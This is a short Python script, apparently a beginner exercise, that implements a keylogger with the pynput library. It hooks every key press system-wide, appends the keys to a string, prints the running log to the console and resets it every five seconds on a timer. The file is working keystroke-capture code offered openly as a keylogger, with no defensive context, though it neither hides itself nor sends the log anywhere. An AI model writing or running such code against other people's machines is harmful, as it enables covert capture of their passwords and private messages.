#!/usr/bin/env python3

import pynput.keyboard
import threading

log = ""

def process_key(key):
    global log

    try:
        log += str(key.char)
    except AttributeError:
        log += " " if str(key) == "Key.space" else f" {str(key).split('.')[1].upper()} " 
    
    print(log)

def clear_log():
    global log
    log = ""

    timer = threading.Timer(5, clear_log)
    timer.start()

keylogger = pynput.keyboard.Listener(on_press=process_key)

with keylogger:
    clear_log()
    keylogger.join()
